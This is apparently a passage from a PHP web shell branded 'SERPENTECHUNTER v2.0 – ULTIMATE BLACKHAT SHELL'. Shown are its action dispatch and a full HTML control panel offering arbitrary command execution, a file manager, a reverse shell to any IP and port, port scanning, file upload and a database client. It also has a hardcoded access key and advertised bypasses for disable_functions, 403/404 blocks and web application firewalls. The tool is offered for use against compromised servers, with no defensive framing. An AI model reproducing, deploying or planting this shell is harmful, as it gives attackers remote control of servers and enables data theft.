} elseif ($action === 'db') {
    $db_result = sc_db_connect($params['type'], $params['host'], $params['user'], $params['pass'], $params['dbname']);
    if (is_array($db_result)) {
        $output = "✅ Connected to " . strtoupper($params['type']) . "!\n";
        $output .= "📊 Run queries via exec command with SQL";
    } else {
        $output = $db_result;
    }
} else {
    $output = "🐍 SERPENTECHUNTER v2.0 – ULTIMATE BLACKHAT SHELL\n";
    $output .= "🔥 DEVELOPER: SerpentSecHunter | RILIS: 02-07-2026\n";
    $output .= "📌 COMMAND: ?action=exec&cmd=whoami\n";
    $output .= "📁 FILE: ?action=file&cmd=list&target=/tmp\n";
    $output .= "🌐 REVERSE: ?action=reverse&ip=0.0.0.0&port=4444\n";
    $output .= "🔍 PORTSCAN: ?action=portscan&target=127.0.0.1&params[ports]=1-100\n";
    $output .= "🗄️  DB: ?action=db&params[type]=mysql&params[host]=localhost&params[user]=root&params[pass]=&params[dbname]=test\n";
    $output .= "📤 UPLOAD: use POST form below\n";
    $output .= "\n💀 BYPASS: 403/404 (9 teknik) | disable_functions (12 strategi) | WAF (6 teknik)";
}

// Server info untuk debugging
$server_info = "OS: " . PHP_OS . " | PHP: " . phpversion() . " | Server: " . ($_SERVER['SERVER_SOFTWARE'] ?? 'Unknown');
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>🐍 SERPENTECHUNTER v2.0 – TRUE BYPASS</title>
<style>
    * { margin:0; padding:0; box-sizing:border-box; }
    body { background:#0a0a0a; color:#00ff00; font-family: 'Courier New', monospace; padding:15px; }
    .container { max-width:1400px; margin:auto; }
    .header { text-align:center; border-bottom:2px solid #00ff00; padding-bottom:20px; margin-bottom:30px; }
    .header h1 { color:#00ff00; font-size:36px; text-shadow:0 0 30px #00ff00, 0 0 60px #00ff0044; }
    .header .sub { color:#ff4444; font-size:16px; }
    .header .dev { color:#ffaa00; font-size:14px; }
    .header .info { font-size:12px; color:#888; margin-top:5px; }
    .panel { background:#111; border:1px solid #00ff00; padding:15px; margin-bottom:20px; border-radius:10px; }
    .panel h3 { color:#00ff88; margin-bottom:12px; border-bottom:1px solid #00ff0044; padding-bottom:8px; }
    input[type="text"], input[type="file"], select, textarea { width:100%; padding:10px; background:#1a1a1a; border:1px solid #00ff00; color:#00ff00; border-radius:5px; margin-bottom:8px; font-family:'Courier New',monospace; }
    button { background:#00ff00; color:#000; border:none; padding:10px 20px; font-size:14px; font-weight:bold; border-radius:5px; cursor:pointer; transition:0.3s; }
    button:hover { background:#00ff88; transform:scale(1.03); box-shadow:0 0 20px #00ff0066; }
    .btn-danger { background:#ff4400; color:#fff; }
    .btn-danger:hover { background:#ff6600; }
    .btn-upload { background:#ffaa00; color:#000; }
    .btn-upload:hover { background:#ffcc44; }
    .output { background:#0d0d0d; border:1px solid #00ff00; padding:12px; border-radius:5px; white-space:pre-wrap; font-size:12px; max-height:500px; overflow-y:auto; }
    .grid-2 { display:grid; grid-template-columns:1fr 1fr; gap:15px; }
    .grid-3 { display:grid; grid-template-columns:1fr 1fr 1fr; gap:15px; }
    .grid-4 { display:grid; grid-template-columns:1fr 1fr 1fr 1fr; gap:15px; }
    .badge { background:#00ff00; color:#000; padding:2px 10px; border-radius:3px; font-weight:bold; font-size:12px; }
    .badge-red { background:#ff4400; color:#fff; padding:2px 10px; border-radius:3px; font-weight:bold; font-size:12px; }
    .badge-blue { background:#0066ff; color:#fff; padding:2px 10px; border-radius:3px; font-weight:bold; font-size:12px; }
    .badge-purple { background:#8800ff; color:#fff; padding:2px 10px; border-radius:3px; font-weight:bold; font-size:12px; }
    .badge-orange { background:#ff8800; color:#000; padding:2px 10px; border-radius:3px; font-weight:bold; font-size:12px; }
    .badge-gold { background:gold; color:#000; padding:2px 10px; border-radius:3px; font-weight:bold; font-size:12px; }
    .footer { text-align:center; border-top:1px solid #00ff0044; padding-top:20px; margin-top:30px; color:#666; font-size:11px; }
    .method-tag { display:inline-block; padding:1px 8px; border-radius:3px; font-size:10px; margin-left:8px; }
    .method-ffi { background:#8800ff; color:#fff; }
    .method-ldpreload { background:#ff8800; color:#000; }
    .method-modcgi { background:#00aaff; color:#fff; }
    .method-php-fpm { background:#00ff88; color:#000; }
    .method-imagemagick { background:#ff66aa; color:#fff; }
    .method-sendmail { background:#cc44cc; color:#fff; }
    .method-perl { background:#3399ff; color:#fff; }
    .method-python { background:#ffcc00; color:#000; }
    .method-gcc { background:#ff6666; color:#fff; }
    .method-bash { background:#66ff66; color:#000; }
    .method-pcntl_exec { background:#aa66ff; color:#fff; }
    .method-mail_attach { background:#ff8800; color:#000; }
    .method-proc_open { background:#00aaff; color:#fff; }
    .method-shell_exec { background:#00aa00; color:#fff; }
    .method-exec { background:#0088aa; color:#fff; }
    .method-system { background:#0066aa; color:#fff; }
    .method-passthru { background:#004488; color:#fff; }
    .method-background { background:#ff00ff; color:#fff; }
    .method-none { background:#ff0000; color:#fff; }
    @media (max-width: 768px) {
        .grid-2, .grid-3, .grid-4 { grid-template-columns:1fr; }
        .header h1 { font-size:24px; }
        .panel { padding:10px; }
    }
</style>
</head>
<body>
<div class="container">
    <div class="header">
        <h1>🐍 SERPENTECHUNTER v2.0</h1>
        <div class="sub">🔥 TRUE BYPASS – 403/404 + DISABLE_FUNCTIONS + WAF 🔥</div>
        <div class="dev">👑 DEVELOPER: SerpentSecHunter | 📅 RILIS: 02-07-2026</div>
        <div style="margin-top:8px; font-size:13px;">
            🛡️ MODE: <span class="badge">KILL MODE</span> |
            🚀 STATUS: <span class="badge">ACTIVE</span> |
            👑 USER: <span class="badge">SerpentSecHunter</span> |
            📍 CWD: <span class="badge-blue"><?= htmlspecialchars(getcwd()) ?></span>
        </div>
        <div class="info"><?= htmlspecialchars($server_info) ?></div>
        <div style="margin-top:5px; font-size:10px; color:#888; display:flex; flex-wrap:wrap; justify-content:center; gap:3px;">
            <span class="badge-purple">FFI</span>
            <span class="badge-purple">LD_PRELOAD</span>
            <span class="badge-purple">mod_cgi</span>
            <span class="badge-purple">PHP-FPM</span>
            <span class="badge-purple">ImageMagick</span>
            <span class="badge-purple">sendmail</span>
            <span class="badge-purple">perl</span>
            <span class="badge-purple">python</span>
            <span class="badge-purple">gcc</span>
            <span class="badge-purple">bash</span>
            <span class="badge-purple">pcntl_exec</span>
            <span class="badge-purple">mail_attach</span>
            <span class="badge-gold">403/404 BYPASS</span>
            <span class="badge-gold">WAF BYPASS</span>
        </div>
    </div>

    <div class="panel">
        <h3>🎯 COMMAND CENTER</h3>
        <div class="grid-4">
            <form method="GET">
                <input type="hidden" name="action" value="exec">
                <input type="text" name="cmd" placeholder="💀 Command..." value="<?= htmlspecialchars($cmd) ?>">
                <button type="submit">⚡ EXECUTE</button>
            </form>
            <form method="GET">
                <input type="hidden" name="action" value="file">
                <input type="text" name="cmd" placeholder="📁 list|read|write|delete|rename|chmod|search|archive|extract" value="list">
                <input type="text" name="target" placeholder="🎯 Path..." value="<?= htmlspecialchars($target) ?>">
                <button type="submit">📂 FILE MANAGER</button>
            </form>
            <form method="GET">
                <input type="hidden" name="action" value="reverse">
                <input type="text" name="ip" placeholder="🌐 IP..." value="<?= htmlspecialchars($ip) ?>">
                <input type="text" name="port" placeholder="🔌 Port..." value="<?= htmlspecialchars($port) ?>">
                <button type="submit" class="btn-danger">🔥 REVERSE SHELL</button>
            </form>
            <form method="GET">
                <input type="hidden" name="action" value="portscan">
                <input type="text" name="target" placeholder="🎯 Host/IP..." value="<?= htmlspecialchars($target) ?>">
                <input type="text" name="params[ports]" placeholder="🔌 Ports (1-1000)" value="1-100">
                <button type="submit">🔍 PORT SCAN</button>
            </form>
        </div>
    </div>

    <div class="panel" style="border-color:#ffaa00;">
        <h3>📤 UPLOAD FILE</h3>
        <form method="POST" enctype="multipart/form-data" action="?action=file&cmd=upload&target=<?= urlencode(getcwd()) ?>">
            <div style="display:flex; flex-wrap:wrap; gap:10px; align-items:center;">
                <input type="file" name="file" style="flex:1; min-width:200px;" required>
                <button type="submit" class="btn-upload">⬆ UPLOAD</button>
            </div>
            <p style="font-size:11px; color:#888; margin-top:5px;">📌 File akan diupload ke: <?= htmlspecialchars(getcwd()) ?></p>
            <p style="font-size:10px; color:#666;">⚠️ Maksimal file: <?= ini_get('upload_max_filesize') ?> (PHP.ini)</p>
        </form>
    </div>

    <div class="panel" style="border-color:#0066ff;">
        <h3>🗄️ DATABASE CLIENT</h3>
        <form method="GET">
            <input type="hidden" name="action" value="db">
            <div class="grid-3">
                <select name="params[type]" style="width:100%; padding:12px; background:#1a1a1a; border:1px solid #00ff00; color:#00ff00; border-radius:5px; margin-bottom:10px;">
                    <option value="mysql">MySQL</option>
                    <option value="pgsql">PostgreSQL</option>
                    <option value="sqlite">SQLite</option>
                </select>
                <input type="text" name="params[host]" placeholder="🖥️ Host..." value="localhost">
                <input type="text" name="params[dbname]" placeholder="🗄️ Database..." value="test">
            </div>
            <div class="grid-3">
                <input type="text" name="params[user]" placeholder="👤 Username..." value="root">
                <input type="text" name="params[pass]" placeholder="🔑 Password..." value="">
                <button type="submit" style="background:#0066ff;">🔗 CONNECT</button>
            </div>
        </form>
    </div>

    <div class="panel">
        <h3>📋 OUTPUT <?php if (isset($exec_method) && $exec_method !== 'NONE'): ?><span class="method-tag method-<?= strtolower($exec_method) ?>"><?= strtoupper($exec_method) ?></span><?php endif; ?></h3>
        <div class="output"><?= htmlspecialchars($output) ?></div>
    </div>

    <div class="panel">
        <h3>📚 QUICK REFERENCE</h3>
        <div style="font-size:12px; color:#aaa; display:grid; grid-template-columns:1fr 1fr 1fr; gap:8px;">
            <div><span class="badge">EXEC</span> ?action=exec&cmd=whoami</div>
            <div><span class="badge">FILE</span> ?action=file&cmd=list&target=/tmp</div>
            <div><span class="badge">REVERSE</span> ?action=reverse&ip=1.2.3.4&port=4444</div>
            <div><span class="badge">SCAN</span> ?action=portscan&target=127.0.0.1&params[ports]=1-100</div>
            <div><span class="badge">SEARCH</span> ?action=file&cmd=search&target=/var&params[pattern]=config</div>
            <div><span class="badge">ARCHIVE</span> ?action=file&cmd=archive&target=/var/www&params[type]=zip</div>
            <div><span class="badge">UPLOAD</span> Form di atas (POST)</div>
            <div><span class="badge">DB</span> ?action=db&params[type]=mysql&params[host]=localhost&params[user]=root&params[pass]=&params[dbname]=test</div>
            <div><span class="badge">AUTH</span> ?auth=SERPENTECHUNTER666</div>
        </div>
    </div>

    <div class="footer">
        <p>🐍 SERPENTECHUNTER v2.0 – ULTIMATE BLACKHAT SHELL</p>
        <p>👑 DEVELOPER: SerpentSecHunter | 📅 RILIS: 02-07-2026</p>
        <p>💀 "TIDAK ADA YANG GAK BISA!" – ZAMZZZ 😈</p>
        <p>🔥 BYPASS: 403/404 (9 teknik) | disable_functions (12 strategi) | WAF (6 teknik)</p>
        <p style="color:#444;">© 2026 SerpentSecHunter – ALL RIGHTS RESERVED</p>
    </div>
</div>
</body>
</html>
